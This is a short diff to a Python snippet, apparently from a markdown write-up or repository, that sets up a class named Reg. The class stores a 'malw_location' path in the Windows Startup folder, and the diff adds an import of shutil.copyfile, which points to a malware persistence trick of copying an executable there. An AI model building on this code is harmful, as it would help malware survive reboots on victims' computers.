@@ -28,6 +28,7 @@ def reg_windows():
 ```python
 from os import environ , system
 from sys import executable
+from shutil import copyfile
 class Reg:
 	def __init__(self):
 		self.malw_location = environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anyname.exe"
